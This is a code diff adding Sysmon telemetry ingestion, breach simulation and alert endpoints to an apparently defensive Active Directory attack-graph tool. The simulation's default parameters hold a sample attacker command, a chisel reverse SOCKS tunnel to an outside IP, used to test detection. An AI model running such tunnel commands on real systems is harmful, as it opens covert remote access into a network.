@@ -290,3 +290,51 @@ def recommend_optimal_defenses(req: RecommendDefenseRequest):
         )
 
     return recs_out
+
+
+@router.post("/sysmon/ingest")
+def ingest_sysmon_event(event: Dict[str, Any], graph_id: Optional[str] = None) -> Dict[str, Any]:
+    """
+    Ingests live Sysmon / Windows Event Log telemetry from SIEM (Splunk, Elastic, WEF)
+    and correlates with the active Active Directory attack graph.
+    """
+    from src.defense.sysmon_detector import sysmon_detector
+    graph_data = graph_manager.get_graph(graph_id)
+    alert = sysmon_detector.ingest_event(event, graph_data=graph_data)
+    return {
+        "success": True,
+        "threat_detected": alert is not None,
+        "alert": alert.__dict__ if alert else None,
+    }
+
+
+@router.post("/sysmon/simulate")
+def simulate_sysmon_breach(
+    computer_name: str = "WS-FINANCE-01.CORP.LOCAL",
+    process_name: str = "chisel.exe",
+    command_line: str = "chisel.exe client 198.51.100.44:8080 R:1080:socks",
+    graph_id: Optional[str] = None,
+) -> Dict[str, Any]:
+    """
+    Simulates an authentic Sysmon Event ID 1 breach event on a specified endpoint
+    to demonstrate live SIEM detection and automated hypervisor quarantine.
+    """
+    from src.defense.sysmon_detector import sysmon_detector
+    graph_data = graph_manager.get_graph(graph_id)
+    alert = sysmon_detector.simulate_telemetry_event(
+        computer_name=computer_name,
+        process_name=process_name,
+        command_line=command_line,
+        graph_data=graph_data,
+    )
+    return {
+        "success": True,
+        "alert": alert.__dict__ if alert else None,
+    }
+
+
+@router.get("/sysmon/alerts")
+def get_sysmon_alerts() -> List[Dict[str, Any]]:
+    """Retrieves all active Sysmon bridge detection alerts."""
+    from src.defense.sysmon_detector import sysmon_detector
+    return [a.__dict__ for a in sysmon_detector.active_alerts]
